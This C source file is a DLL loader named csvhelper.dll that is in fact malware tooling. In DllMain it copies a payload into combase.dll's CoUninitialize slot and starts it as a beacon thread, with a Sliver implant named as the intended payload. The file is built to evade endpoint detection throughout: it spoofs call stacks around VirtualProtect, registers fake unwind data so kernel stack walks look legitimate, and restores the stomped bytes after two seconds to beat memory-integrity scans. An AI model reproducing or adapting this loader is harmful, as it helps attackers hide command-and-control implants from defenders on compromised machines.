/*
 * plugin.c — csvhelper.dll: combase.dll slot loader with JIT restore
 *
 * All work happens in DllMain, which runs synchronously during the
 * launcher's LoadLibraryA call. Plaintext PICO is retrieved from the
 * launcher EXE via its GetPayload export, copied into combase's
 * CoUninitialize slot (RW → memcpy → RX), and the beacon thread handle
 * is handed back to the launcher through SetThreadHandle.
 *
 * Before the overwrite, we snapshot the slot's original bytes and hand
 * them to a background restorer thread; ~2s after handoff the slot is
 * memcpy'd back to its on-disk contents so a periodic memory-integrity
 * scan (S1 t+45s window) sees a pristine module.
 *
 * combase.dll must already be resident — the launcher pre-loads it so
 * we resolve with GetModuleHandleW alone, avoiding a LoadLibrary call
 * under the loader lock.
 *
 * IAT: kernel32 only — GetModuleHandleW, GetProcAddress, VirtualProtect,
 * CreateThread, CloseHandle, GetProcessHeap, HeapAlloc, HeapFree, Sleep.
 * No LoadLibrary, no bcrypt, no advapi32, no filesystem.
 */

#include <windows.h>
#include "spoof.h"

typedef void  (WINAPI *pfnGetPayload)(void **, SIZE_T *);
typedef void  (WINAPI *pfnSetThreadHandle)(HANDLE);
typedef void *(WINAPI *pfnGetGhostAddr)(void);

/* BYOUD (Bring Your Own Unwind Data): register synthetic RUNTIME_FUNCTION
 * unwind info for the payload region via RtlAddFunctionTable so kernel
 * stack walks through the region resolve to a legitimate unwind chain. */

typedef BOOLEAN (WINAPI *pfnRtlAddFunctionTable)(PRUNTIME_FUNCTION, DWORD, DWORD64);

static RUNTIME_FUNCTION g_byoud_fn_tbl[1] = {{0}};
static BYTE g_byoud_unwind[16] = {0};

static void setup_byoud(void *slot, SIZE_T len)
{
    HMODULE combase = GetModuleHandleW(L"combase.dll");
    if (!combase) return;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    pfnRtlAddFunctionTable p = (pfnRtlAddFunctionTable)GetProcAddress(ntdll, "RtlAddFunctionTable");
    if (!p) return;

    DWORD64 base = (DWORD64)combase;
    DWORD rva_start = (DWORD)((DWORD64)slot - base);
    DWORD rva_unwind = (DWORD)((DWORD64)g_byoud_unwind - base);

    g_byoud_fn_tbl[0].BeginAddress = rva_start;
    g_byoud_fn_tbl[0].EndAddress   = rva_start + (DWORD)len;
    g_byoud_fn_tbl[0].UnwindData   = rva_unwind;

    g_byoud_unwind[0] = 0x01;
    g_byoud_unwind[1] = 0x10;
    g_byoud_unwind[2] = 0x04;
    g_byoud_unwind[3] = 0x50;
    g_byoud_unwind[4] = 0x10;
    g_byoud_unwind[5] = 0x11;
    *(DWORD*)(g_byoud_unwind + 6) = 0x8000;
    g_byoud_unwind[10] = 0x01;
    g_byoud_unwind[11] = 0x50;

    p(g_byoud_fn_tbl, 1, base);
}

typedef struct {
    void  *slot;
    SIZE_T len;
    BYTE   original[];
} restore_ctx_t;

/*
 * ponytail: demo-PICO only. Restores combase's original bytes ~2s after
 * launch so periodic memory-integrity scans see a pristine module. Safe
 * only because the Crystal Palace demo PICO returns immediately after
 * the initial handoff — a real Sliver implant keeps executing from the
 * slot and this would page-fault it. Upgrade path: relocate the beacon
 * off the slot (own RWX alloc) before restoration, or drop this thread.
 */
static DWORD WINAPI restore_slot(LPVOID p)
{
    restore_ctx_t *c = (restore_ctx_t *)p;
    Sleep(2000);
    DWORD old;
    if (spoof_vp(c->slot, c->len, PAGE_READWRITE, &old)) {
        memcpy(c->slot, c->original, c->len);
        spoof_vp(c->slot, c->len, PAGE_EXECUTE_READ, &old);
    }
    HeapFree(GetProcessHeap(), 0, c);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;

    if (reason != DLL_PROCESS_ATTACH)
        return TRUE;

    DisableThreadLibraryCalls(hinst);

    /* Resolve gadget + signal frames for call-stack spoofing. Failure is
     * non-fatal — spoof_vp falls back to plain VirtualProtect. */
    spoof_init();

    HMODULE exe = GetModuleHandleW(NULL);
    if (!exe) return FALSE;

    /* If the launcher successfully mapped a modified combase copy as a
     * MEM_IMAGE section, its payload address is already RX and lives
     * inside a disk-backed image region. Skip the entire slot-flip path
     * and CreateThread directly. */
    pfnGetGhostAddr gga = (pfnGetGhostAddr)GetProcAddress(exe, "GetGhostAddr");
    if (gga) {
        void *ghost = gga();
        if (ghost) {
            HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ghost,
                                     NULL, 0, NULL);
            if (t) {
                pfnSetThreadHandle sh0 = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
                if (sh0) sh0(t);
                return TRUE;
            }
            /* CreateThread on the ghost failed — fall through to legacy */
        }
    }

    pfnGetPayload gp = (pfnGetPayload)GetProcAddress(exe, "GetPayload");
    if (!gp) return FALSE;

    void *pt = NULL;
    SIZE_T len = 0;
    gp(&pt, &len);
    if (!pt || !len) return FALSE;

    HMODULE combase = GetModuleHandleW(L"combase.dll");
    if (!combase) return FALSE;

    void *slot = (void *)GetProcAddress(combase, "CoUninitialize");
    if (!slot) return FALSE;

    /* Snapshot original slot bytes for later restoration; single heap
     * alloc holds the context struct + original bytes (flex array). */
    HANDLE heap = GetProcessHeap();
    restore_ctx_t *ctx = HeapAlloc(heap, 0, sizeof(*ctx) + len);
    if (!ctx) return FALSE;
    ctx->slot = slot;
    ctx->len  = len;
    memcpy(ctx->original, slot, len);

    DWORD old;
    if (!spoof_vp(slot, len, PAGE_READWRITE, &old))    { HeapFree(heap, 0, ctx); return FALSE; }
    memcpy(slot, pt, len);
    if (!spoof_vp(slot, len, PAGE_EXECUTE_READ, &old)) { HeapFree(heap, 0, ctx); return FALSE; }

    /* Register synthetic unwind data covering the payload region
     * BEFORE launching the beacon thread, so any subsequent kernel
     * stack walk unwinds cleanly through the region as a legitimate
     * frame of combase.dll (its module base). */
    setup_byoud(slot, len);

    HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)slot, NULL, 0, NULL);
    if (!t) { HeapFree(heap, 0, ctx); return FALSE; }

    pfnSetThreadHandle sh = (pfnSetThreadHandle)GetProcAddress(exe, "SetThreadHandle");
    if (sh) sh(t);

    HANDLE rt = CreateThread(NULL, 0, restore_slot, ctx, 0, NULL);
    if (rt) CloseHandle(rt);
    else    HeapFree(heap, 0, ctx);

    return TRUE;
}
